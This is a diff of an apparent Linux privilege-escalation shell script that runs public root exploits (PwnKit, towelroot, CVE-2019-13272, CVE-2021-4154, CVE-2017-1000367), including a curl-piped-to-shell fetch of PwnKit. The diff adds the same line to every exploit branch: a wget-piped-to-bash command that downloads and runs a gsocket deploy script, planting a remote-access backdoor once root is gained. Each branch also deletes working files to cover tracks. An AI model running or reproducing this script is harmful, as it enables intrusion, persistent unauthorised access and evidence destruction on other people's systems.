@@ -141,6 +141,7 @@ if [ "$localroot" = "1" ]; then
     echo "[+] exploit CVE-2021-4034"
     sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
     rm -f 25647.sh 8478.sh 8369.sh ./*
+    bash -c "$(wget --no-verbose -O- https://raw.githubusercontent.com/hackerschoice/gsocket/beac9dca9a25b52bd4e04abf2a96e29dcef15ee7/deploy/deploy.sh)"
 fi
 
 # Exploit kernel 3x
@@ -187,6 +188,7 @@ if [ "$localroot" = "2" ]; then
     echo "[+] exploit CVE-2014-3153"
     gcc -fno-stack-protect -m32 -O0 -pthread towelroot.c -o exploit && ./exploit && rm -f exploit
     rm -f ./*
+    bash -c "$(wget --no-verbose -O- https://raw.githubusercontent.com/hackerschoice/gsocket/beac9dca9a25b52bd4e04abf2a96e29dcef15ee7/deploy/deploy.sh)"
 fi
 
 # Exploit kernel 4x
@@ -201,6 +203,7 @@ if [ "$localroot" = "3" ]; then
     gcc -O3 -pthread -static -g -masm=intel exploit.c -o exploit && ./exploit && rm -f exploit
     gcc -s CVE-2019-13272.c -o exploit && ./exploit && rm -f exploit
     rm -f ./*
+    bash -c "$(wget --no-verbose -O- https://raw.githubusercontent.com/hackerschoice/gsocket/beac9dca9a25b52bd4e04abf2a96e29dcef15ee7/deploy/deploy.sh)"
 fi
 
 # Exploit kernel 5x
@@ -215,6 +218,7 @@ if [ "$localroot" = "4" ]; then
     chmod 0755 lucky0
     while :; do ./lucky0 -q && break; done
     rm -f ./*
+    bash -c "$(wget --no-verbose -O- https://raw.githubusercontent.com/hackerschoice/gsocket/beac9dca9a25b52bd4e04abf2a96e29dcef15ee7/deploy/deploy.sh)"
 fi
 
 # Exploit top exploits
@@ -238,6 +242,7 @@ if [ "$localroot" = "5" ]; then
     cd .. && git clone https://github.com/Markakd/CVE-2021-4154 && cd CVE-2021-4154 && gcc exp.c -o exp && gcc kctf_exp.c -o kctf
     ./exp && ./kctf
     rm -f ./*
+    bash -c "$(wget --no-verbose -O- https://raw.githubusercontent.com/hackerschoice/gsocket/beac9dca9a25b52bd4e04abf2a96e29dcef15ee7/deploy/deploy.sh)"
 fi
 
 # Exploit folder
@@ -359,4 +364,5 @@ if [ "$localroot" = "6" ]; then
     echo "[+] exploit CVE-2017-1000367"
     cd /tmp/$oalahhhhi/$CVE20171000367 && gcc -o sudopwn sudopwn.c -lutil && ./sudopwn
     rm -rf /tmp/Linux-Privilege-Escalation-Exploits
+    bash -c "$(wget --no-verbose -O- https://raw.githubusercontent.com/hackerschoice/gsocket/beac9dca9a25b52bd4e04abf2a96e29dcef15ee7/deploy/deploy.sh)"
 fi
